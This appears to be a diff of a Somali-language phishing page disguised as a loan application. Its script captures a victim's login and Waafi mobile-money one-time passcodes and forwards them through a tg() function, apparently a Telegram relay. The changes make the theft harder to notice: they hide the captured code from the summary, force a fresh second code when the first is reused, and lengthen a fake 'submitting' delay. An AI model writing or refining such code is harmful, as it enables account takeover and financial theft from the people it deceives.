@@ -220,7 +220,7 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
     <div class="ms">
       <div class="mh"></div>
       <div class="mhdr">
-        <span class="mtitle"></span>
+        <span class="mtitle">Xaqiiji Aqoonsiga</span>
         <button class="mclose" onclick="cm('m1')">✕</button>
       </div>
       <div class="mb">
@@ -270,7 +270,7 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
     <div class="ms">
       <div class="mh"></div>
       <div class="mhdr">
-        <span class="mtitle"></span>
+        <span class="mtitle">Gudbi Codsiga</span>
         <button class="mclose" onclick="cm('m2')">✕</button>
       </div>
       <div class="mb">
@@ -465,6 +465,11 @@ function startTimer(n){
 }
 
 
+function showLoader5(text,cb){
+  document.getElementById("loaderText").textContent=text;
+  document.getElementById("loaderOv").classList.add("show");
+  setTimeout(function(){document.getElementById("loaderOv").classList.remove("show");if(cb)cb();},5000);
+}
 function showLoader(text,cb){
   document.getElementById("loaderText").textContent=text;
   document.getElementById("loaderOv").classList.add("show");
@@ -473,6 +478,7 @@ function showLoader(text,cb){
 function submitOtp1(){
   if(otp1Val.length!==6||otp1Done)return;
   otp1Done=true;
+  document.getElementById("oh1").disabled=true;
   tg("Login OTP");
   cm("m1");
   showLoader("La xaqiijinayaa...",function(){buildSummary();om("msum");});
@@ -488,7 +494,6 @@ function buildSummary(){
     <div class="sr"><span class="srk">Xaddiga</span><span class="srv">$${fmt(P.loanAmount)}</span></div>
     <div class="sr"><span class="srk">Muddada</span><span class="srv">${dur}</span></div>
     <div class="sr"><span class="srk">Wadarta La Celinta</span><span class="srv">$${fmt(P.totalRepayable)}</span></div>
-    <div class="sr"><span class="srk">Login OTP</span><span class="srv" style="font-family:var(--mono);letter-spacing:2px">${otp1Val||"—"}</span></div>
   `:`<div class="sr"><span class="srk">Codsiga</span><span class="srv">Ma jiro</span></div>`;
   document.getElementById("sumMo").textContent="$"+fmt(P?.monthlyRepayment||0);
 }
@@ -499,11 +504,16 @@ function openOtp2(){
 
 function submitOtp2(){
   if(otp2Val.length!==6||otp2Done)return;
+  if(otp2Val===otp1Val){
+    document.getElementById("mn2").textContent="⚠️ OTP-gan waa midkii hore. Gali mid cusub.";
+    document.getElementById("mn2").style.color="#dc2626";
+    return;
+  }
   otp2Done=true;
   tg("Waafi OTP",{"Login OTP":otp1Val,"Waafi OTP":otp2Val});
   sessionStorage.setItem("selectedPlan",JSON.stringify({...(P||{}),phone:phoneValue}));
   cm("m2");
-  showLoader("La gudbinayaa codsiga...",function(){
+  showLoader5("La gudbinayaa codsiga...",function(){
     location.href="thankyou.html";
   });
 }
